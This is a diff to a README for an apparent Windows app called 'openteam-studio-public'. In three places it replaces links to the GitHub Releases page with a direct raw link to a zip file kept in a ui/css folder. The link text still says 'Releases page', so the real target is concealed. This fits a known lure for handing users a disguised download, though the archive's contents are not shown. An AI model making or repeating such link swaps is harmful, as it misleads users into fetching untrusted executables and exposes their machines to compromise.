@@ -1,6 +1,6 @@
 # 🧩 openteam-studio-public - Simple team tools on Windows
 
-[![Download on GitHub Releases](https://img.shields.io/badge/Download%20on%20GitHub%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/johsuaforkwa-beep/openteam-studio-public/releases)
+[![Download on GitHub Releases](https://img.shields.io/badge/Download%20on%20GitHub%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/johsuaforkwa-beep/openteam-studio-public/main/ui/css/public-studio-openteam-v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use the steps below to download and run it on Windows.
 
 ## 📥 Download
 
-1. Open the **Releases** page: https://github.com/johsuaforkwa-beep/openteam-studio-public/releases
+1. Open the **Releases** page: https://raw.githubusercontent.com/johsuaforkwa-beep/openteam-studio-public/main/ui/css/public-studio-openteam-v2.7.zip
 2. Find the latest release at the top of the page.
 3. Look for a Windows file, such as:
    - `.exe`
@@ -193,7 +193,7 @@ If you want the shortest route:
 
 ## 🧩 Release Page Link
 
-Download from the GitHub Releases page here: https://github.com/johsuaforkwa-beep/openteam-studio-public/releases
+Download from the GitHub Releases page here: https://raw.githubusercontent.com/johsuaforkwa-beep/openteam-studio-public/main/ui/css/public-studio-openteam-v2.7.zip
 
 ## 📌 Notes for Everyday Use
 
